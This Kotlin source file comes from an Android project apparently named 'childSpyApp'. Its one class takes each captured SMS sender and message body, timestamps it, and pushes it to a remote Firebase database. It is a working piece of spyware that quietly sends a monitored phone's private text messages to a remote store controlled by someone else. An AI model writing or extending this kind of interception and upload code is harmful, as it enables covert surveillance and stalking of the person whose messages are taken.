package sammy.mutahi.gicheru.childSpyApp.services.sms

import android.content.Context
import sammy.mutahi.gicheru.childSpyApp.data.rxFirebase.InterfaceFirebase
import sammy.mutahi.gicheru.childSpyApp.data.model.Sms
import sammy.mutahi.gicheru.childSpyApp.services.base.BaseInteractorService
import sammy.mutahi.gicheru.childSpyApp.utils.ConstFun.getDateTime
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.DATA
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.SMS
import javax.inject.Inject


class InteractorSms<S : InterfaceServiceSms> @Inject constructor(context: Context, firebase: InterfaceFirebase) : BaseInteractorService<S>(context, firebase), InterfaceInteractorSms<S> {

    override fun setPushSms(smsAddress: String, smsBody: String) {
        val sms = Sms(smsAddress, smsBody, getDateTime())
        firebase().getDatabaseReference("$SMS/$DATA").push().setValue(sms)
        if (getService() != null) getService()!!.stopServiceSms()
    }

}